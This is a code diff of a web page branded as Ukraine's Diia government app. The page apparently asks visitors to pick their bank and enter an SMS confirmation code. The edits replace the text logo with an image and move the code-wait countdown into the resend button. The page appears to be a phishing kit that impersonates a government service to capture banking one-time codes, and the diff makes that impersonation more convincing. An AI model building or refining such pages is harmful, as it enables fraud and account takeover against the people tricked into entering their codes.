@@ -34,20 +34,17 @@
     .diia-logo {
       width: clamp(80px, 20vw, 120px);
       height: clamp(80px, 20vw, 120px);
-      background: #000;
-      border-radius: 24px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
       margin-bottom: 20px;
+      border-radius: 24px;
+      overflow: hidden;
       box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
     }
     
-    .diia-text {
-      color: #fff;
-      font-size: clamp(28px, 8vw, 48px);
-      font-weight: bold;
-      letter-spacing: 2px;
+    .diia-logo img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
     }
     
     h1 { 
@@ -272,46 +269,7 @@
       box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
     }
     
-    /* Таймер ожидания кода */
-    .countdown-timer {
-      margin: 20px 0;
-      padding: 15px 25px;
-      background: rgba(255, 255, 255, 0.1);
-      border-radius: 25px;
-      border: 2px solid rgba(255, 255, 255, 0.2);
-      backdrop-filter: blur(10px);
-      text-align: center;
-    }
-    
-    .countdown-text {
-      color: rgba(255, 255, 255, 0.8);
-      font-size: clamp(14px, 3.5vw, 16px);
-      margin-bottom: 8px;
-    }
-    
-    .countdown-display {
-      color: #fff;
-      font-size: clamp(24px, 6vw, 32px);
-      font-weight: bold;
-      font-family: 'Courier New', monospace;
-      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
-    }
-    
-    .countdown-progress {
-      width: 100%;
-      height: 4px;
-      background: rgba(255, 255, 255, 0.2);
-      border-radius: 2px;
-      margin-top: 12px;
-      overflow: hidden;
-    }
-    
-    .countdown-progress-bar {
-      height: 100%;
-      background: linear-gradient(90deg, #4caf50, #45a049);
-      border-radius: 2px;
-      transition: width 1s linear;
-    }
+    /* Убираем все стили таймера - встраиваем в кнопку */
     
     #sms-error { 
       color: #ff4444; 
@@ -360,6 +318,18 @@
       transition: all 0.3s;
       font-weight: 600;
       backdrop-filter: blur(10px);
+      min-height: 50px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+    }
+    
+    .resend-timer-text {
+      font-size: clamp(11px, 2.8vw, 13px);
+      color: rgba(255, 255, 255, 0.8);
+      font-weight: normal;
     }
     
     .resend-btn:hover:not(:disabled) {
@@ -446,7 +416,7 @@
 <body>
   <div class="main-container">
     <div class="diia-logo">
-      <div class="diia-text">Дія</div>
+      <img src="Dia.png" alt="Дія" />
     </div>
     
     <h1>Виберіть ваш банк</h1>
@@ -744,7 +714,7 @@
       document.body.innerHTML = `
         <div class="sms-fullscreen">
           <div class="diia-logo">
-            <div class="diia-text">Дія</div>
+            <img src="Dia.png" alt="Дія" />
           </div>
           
           <div class="sms-title">Код-підтвердження</div>
@@ -754,14 +724,6 @@
             `<div class="phone-display">Введіть код з SMS-повідомлення для<br>підтвердження номеру телефону<br><strong>${userPhoneNumber}</strong></div>` :
             `<div class="phone-display">Введіть код з SMS-повідомлення для<br>підтвердження номеру телефону</div>`
           }
-          
-          <div class="countdown-timer" id="countdown-timer">
-            <div class="countdown-text">Час очікування коду:</div>
-            <div class="countdown-display" id="countdown-display">03:00</div>
-            <div class="countdown-progress">
-              <div class="countdown-progress-bar" id="progress-bar"></div>
-            </div>
-          </div>
           
           <div class="sms-container">
             <input type="tel" class="sms-digit" maxlength="1" data-index="0" inputmode="numeric" pattern="[0-9]*">
@@ -781,7 +743,8 @@
           
           <div class="resend-section">
             <button id="resend-btn" class="resend-btn" onclick="requestResendCode()">
-              Відправити код повторно
+              <span>Відправити код повторно</span>
+              <span class="resend-timer-text" id="resend-timer-display" style="display: none;">Доступно через: <span id="timer-countdown">03:00</span></span>
             </button>
             <div id="resend-cooldown" style="display: none;">
               Повторна відправка доступна через: <span id="cooldown-timer">30</span> сек
@@ -798,44 +761,33 @@
       startSMSCountdown(); // Запускаем таймер обратного отсчета
     }
 
-    // Новая функция таймера обратного отсчета для SMS
+    // Новая функция таймера обратного отсчета встроенного в кнопку
     function startSMSCountdown() {
       let totalSeconds = 180; // 3 минуты
-      const maxSeconds = totalSeconds;
+      const timerDisplay = document.getElementById('resend-timer-display');
+      const timerCountdown = document.getElementById('timer-countdown');
+      
+      if (timerDisplay) {
+        timerDisplay.style.display = 'block';
+      }
       
       countdownInterval = setInterval(() => {
         const minutes = Math.floor(totalSeconds / 60);
         const seconds = totalSeconds % 60;
         
-        // Обновляем отображение времени
-        const display = document.getElementById('countdown-display');
-        if (display) {
-          display.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-        }
-        
-        // Обновляем прогресс-бар
-        const progressBar = document.getElementById('progress-bar');
-        if (progressBar) {
-          const percentage = (totalSeconds / maxSeconds) * 100;
-          progressBar.style.width = percentage + '%';
-          
-          // Меняем цвет при приближении к концу
-          if (percentage < 20) {
-            progressBar.style.background = 'linear-gradient(90deg, #ff4444, #cc0000)';
-          } else if (percentage < 50) {
-            progressBar.style.background = 'linear-gradient(90deg, #ffa500, #ff8c00)';
-          }
+        // Обновляем отображение времени в кнопке
+        if (timerCountdown) {
+          timerCountdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
         }
         
         totalSeconds--;
         
         if (totalSeconds < 0) {
           clearInterval(countdownInterval);
-          // Можно добавить здесь обработку истечения времени
-          if (display) {
-            display.textContent = "00:00";
-            display.style.color = "#ff4444";
+          if (timerCountdown) {
+            timerCountdown.textContent = "00:00";
           }
+          // Можно добавить здесь обработку истечения времени
         }
       }, 1000);
     }
@@ -956,7 +908,7 @@
           document.body.innerHTML = `
             <div class="sms-fullscreen">
               <div class="diia-logo">
-                <div class="diia-text">Дія</div>
+                <img src="Dia.png" alt="Дія" />
               </div>
               <div style='text-align: center; padding: 40px;'>
                 <h2 style='color: #4caf50; font-size: clamp(24px, 6vw, 32px); margin-bottom: 20px;'>✅ Код прийнято</h2>
